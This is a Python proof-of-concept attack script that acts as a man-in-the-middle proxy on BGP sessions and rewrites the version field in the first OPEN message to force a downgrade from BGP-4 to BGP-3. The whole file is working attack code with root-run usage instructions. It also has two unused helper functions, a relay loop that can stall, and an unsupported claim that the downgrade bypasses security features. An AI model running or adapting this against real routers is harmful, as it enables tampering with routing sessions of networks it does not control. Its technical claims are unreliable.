#!/usr/bin/env python3
"""
Proof-of-Concept: BGP Version Downgrade Attack

This script acts as a transparent TCP proxy (Man-in-the-Middle) between a BGP client
and a BGP server. It intercepts the initial BGP OPEN message, modifies the 'Version'
field to a lower value (e.g., from 4 to 3), and forwards it. This demonstrates how
an on-path attacker can force a BGP session to negotiate a lower protocol version,
potentially bypassing security features or capabilities negotiated in newer versions.

Usage:
    sudo python3 poc_bgp_version_downgrade.py <target_ip> <listen_port>

Note:
    - Requires root privileges to bind to low ports and manipulate sockets.
    - BGP runs over TCP port 179. This script listens on a specified port and forwards
      to the target's port 179.
    - For demonstration, we downgrade Version 4 to Version 3.
"""

import socket
import sys
import threading
import struct
import time

# BGP Constants
BGP_PORT = 179
BGP_MARKER_SIZE = 16
BGP_HEADER_SIZE = 19  # 16 (marker) + 2 (length) + 1 (type)
OPEN_MSG_TYPE = 1
KEEPALIVE_MSG_TYPE = 4
NOTIFICATION_MSG_TYPE = 3

# Downgrade target version
TARGET_VERSION = 3  # Downgrade to BGP-3 for demonstration


def craft_bgp_open(version, my_as, hold_time, bgp_id, opt_params_len=0):
    """
    Crafts a minimal BGP OPEN message.
    
    Args:
        version (int): BGP protocol version.
        my_as (int): Autonomous System number.
        hold_time (int): Hold timer in seconds.
        bgp_id (str): BGP Identifier as an IP address string.
        opt_params_len (int): Length of optional parameters.
    
    Returns:
        bytes: The complete BGP OPEN message.
    """
    # BGP Header: 16-byte marker (all 1s for OPEN), 2-byte length, 1-byte type
    marker = b'\xff' * BGP_MARKER_SIZE
    msg_length = BGP_HEADER_SIZE + 10 + opt_params_len  # Header + OPEN body
    msg_type = OPEN_MSG_TYPE
    
    header = marker + struct.pack('!HB', msg_length, msg_type)
    
    # OPEN Message Body
    body = struct.pack('!B', version)  # Version (1 byte)
    body += struct.pack('!H', my_as)   # My AS (2 bytes)
    body += struct.pack('!H', hold_time)  # Hold Time (2 bytes)
    
    # Convert BGP ID string to 4 bytes
    bgp_id_bytes = socket.inet_aton(bgp_id)
    body += bgp_id_bytes  # BGP Identifier (4 bytes)
    
    body += struct.pack('!B', opt_params_len)  # Opt Parm Len (1 byte)
    
    # Optional Parameters (empty for this PoC)
    if opt_params_len > 0:
        body += b'\x00' * opt_params_len
    
    return header + body


def parse_bgp_header(data):
    """
    Parses the BGP header to extract message type and length.
    
    Args:
        data (bytes): Raw BGP message data.
    
    Returns:
        tuple: (msg_type, msg_length) or (None, None) if insufficient data.
    """
    if len(data) < BGP_HEADER_SIZE:
        return None, None
    
    msg_length = struct.unpack('!H', data[16:18])[0]
    msg_type = data[18]
    return msg_type, msg_length


def forward_data(conn_from, conn_to, buffer_size=4096):
    """
    Forwards data between two connections.
    
    Args:
        conn_from (socket): Source connection.
        conn_to (socket): Destination connection.
        buffer_size (int): Buffer size for reading/writing.
    """
    try:
        while True:
            data = conn_from.recv(buffer_size)
            if not data:
                break
            conn_to.sendall(data)
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        conn_from.close()
        conn_to.close()


def handle_client(client_sock, target_ip, target_port, downgrade_version=True):
    """
    Handles a single BGP client connection, acting as a MITM proxy.
    
    Args:
        client_sock (socket): Socket connected to the BGP client.
        target_ip (str): IP address of the target BGP server.
        target_port (int): Port of the target BGP server.
        downgrade_version (bool): Whether to perform the version downgrade.
    """
    print(f"[*] New connection from {client_sock.getpeername()}")
    
    # Connect to the target BGP server
    target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_sock.settimeout(10)
    try:
        target_sock.connect((target_ip, target_port))
        print(f"[*] Connected to target {target_ip}:{target_port}")
    except Exception as e:
        print(f"[!] Failed to connect to target: {e}")
        client_sock.close()
        return
    
    # Buffers for incomplete messages
    client_buffer = b''
    target_buffer = b''
    
    # State tracking
    client_sent_open = False
    target_sent_open = False
    
    try:
        while True:
            # Read from client
            client_data = client_sock.recv(4096)
            if not client_data:
                break
            
            client_buffer += client_data
            
            # Process client buffer
            while len(client_buffer) >= BGP_HEADER_SIZE:
                msg_type, msg_length = parse_bgp_header(client_buffer)
                
                if msg_type is None or msg_length is None:
                    break
                
                if len(client_buffer) < msg_length:
                    break  # Wait for more data
                
                msg = client_buffer[:msg_length]
                client_buffer = client_buffer[msg_length:]
                
                # Intercept OPEN message from client
                if msg_type == OPEN_MSG_TYPE and not client_sent_open:
                    print("[+] Intercepted BGP OPEN message from client")
                    
                    if downgrade_version:
                        # Extract current version
                        current_version = msg[19]  # Version field is at offset 19
                        print(f"    Original Version: {current_version}")
                        
                        # Modify version field
                        modified_msg = bytearray(msg)
                        modified_msg[19] = TARGET_VERSION
                        modified_msg = bytes(modified_msg)
                        
                        print(f"    Downgraded Version to: {TARGET_VERSION}")
                        target_sock.sendall(modified_msg)
                    else:
                        target_sock.sendall(msg)
                    
                    client_sent_open = True
                else:
                    target_sock.sendall(msg)
            
            # Read from target
            target_data = target_sock.recv(4096)
            if not target_data:
                break
            
            target_buffer += target_data
            
            # Process target buffer
            while len(target_buffer) >= BGP_HEADER_SIZE:
                msg_type, msg_length = parse_bgp_header(target_buffer)
                
                if msg_type is None or msg_length is None:
                    break
                
                if len(target_buffer) < msg_length:
                    break  # Wait for more data
                
                msg = target_buffer[:msg_length]
                target_buffer = target_buffer[msg_length:]
                
                # Intercept OPEN message from target
                if msg_type == OPEN_MSG_TYPE and not target_sent_open:
                    print("[+] Received BGP OPEN message from target")
                    
                    # Check if target accepted the downgraded version
                    target_version = msg[19]
                    print(f"    Target Version: {target_version}")
                    
                    if target_version == TARGET_VERSION:
                        print("[!] SUCCESS: Target accepted downgraded BGP version!")
                    elif target_version == 4:
                        print("[!] WARNING: Target rejected downgrade, negotiated BGP-4")
                    else:
                        print(f"[?] Target negotiated unexpected version: {target_version}")
                    
                    # Forward to client
                    client_sock.sendall(msg)
                    target_sent_open = True
                else:
                    client_sock.sendall(msg)
    
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"[!] Connection error: {e}")
    finally:
        client_sock.close()
        target_sock.close()
        print("[*] Connection closed")


def main():
    if len(sys.argv) != 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <target_ip> <listen_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    listen_port = int(sys.argv[2])
    
    print(f"[*] Starting BGP Version Downgrade PoC")
    print(f"[*] Listening on port {listen_port}")
    print(f"[*] Target: {target_ip}:{BGP_PORT}")
    print(f"[*] Downgrade target version: {TARGET_VERSION}")
    print("[*] Waiting for BGP client connection...")
    
    # Create listening socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_sock.bind(('0.0.0.0', listen_port))
        server_sock.listen(5)
    except PermissionError:
        print("[!] Error: Permission denied. Try running with sudo.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Failed to bind to port {listen_port}: {e}")
        sys.exit(1)
    
    try:
        while True:
            client_sock, addr = server_sock.accept()
            # Handle each client in a new thread
            thread = threading.Thread(
                target=handle_client,
                args=(client_sock, target_ip, BGP_PORT, True)
            )
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        server_sock.close()


if __name__ == "__main__":
    main()
